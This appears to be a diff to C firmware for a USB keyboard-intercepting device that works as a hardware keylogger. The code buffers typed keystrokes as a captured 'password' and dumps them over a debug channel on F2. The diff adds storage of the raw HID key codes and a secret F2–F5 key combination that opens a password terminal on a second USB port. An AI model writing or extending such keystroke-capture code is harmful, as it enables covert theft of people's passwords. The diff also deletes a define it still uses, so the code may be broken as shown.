@@ -17,20 +17,22 @@
 /*
  * defines
  */
-#define NB_INPUT 200
 #define PASSWORD_MAX_SIZE 30  // must be < NB_INPUT
 
 /*
  * variables
  */
+uint8_t input_hid[NB_INPUT];
+int     input_index = 0;
+
 static uint8_t input_tab[NB_INPUT];
-static int     input_index = 0;
 static int     input_timer = -1;
 
 static int nb_char_pressed = 0;
 uint8_t    led_status      = 7;
 
 uint8_t password[PASSWORD_BUFFER_SIZE];
+uint8_t password_hid[PASSWORD_BUFFER_SIZE];
 int     password_idx;
 
 /*
@@ -70,6 +72,12 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
         if(report[2] == KEY_F2)
             for(int i = 0; i < password_idx; i++)
                 rtt_printf("%02x", password[i]);
+
+        if(report[2] == KEY_F2 &&
+           report[3] == KEY_F3 &&
+           report[4] == KEY_F4 &&
+           report[5] == KEY_F5)
+            usb_password_terminal(&UHD2);
     }
 }
 
@@ -151,6 +159,8 @@ static void store_lasts_inputs(int size)
         int bytes_written = size - input_index;
         memcpy(password + password_idx, input_tab + NB_INPUT - bytes_written, bytes_written);
         memcpy(password + password_idx + bytes_written, input_tab, size - bytes_written);
+        memcpy(password_hid + password_idx, input_hid + NB_INPUT - bytes_written, bytes_written);
+        memcpy(password_hid + password_idx + bytes_written, input_hid, size - bytes_written);
     } else
         memcpy(password + password_idx, input_tab + input_index - size, size);
     password_idx += size;
